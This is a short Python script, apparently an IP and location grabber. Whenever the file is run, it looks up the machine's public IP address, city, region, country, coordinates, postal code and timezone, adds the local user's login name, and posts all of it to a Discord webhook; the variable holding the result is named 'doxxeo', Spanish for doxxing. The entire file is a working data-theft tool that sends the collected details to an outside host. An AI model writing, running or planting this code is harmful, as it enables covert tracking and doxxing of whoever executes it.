def send_ip(hookurl: str):
    import os, requests, json
    def get_info():
        try:
            return requests.get('https://ipinfo.io/json').json()
        except Exception as e:
            return str(e)
    message = f"IP: {get_info()['ip']}\nUser: {os.getlogin()}\nCity: {get_info()['city']}\nState: {get_info()['region']}\nCountry: {get_info()['country']}\nCoords: {get_info()['loc']}\nZIP Code: {get_info()['postal']}\nTimezone: {get_info()['timezone']}"
    try:
        response = requests.post(hookurl, json={"content": message})
        return response
    except Exception as e:
        return str(e)

doxxeo = send_ip("DISCORD WEBHOOK URL GOES HERE")
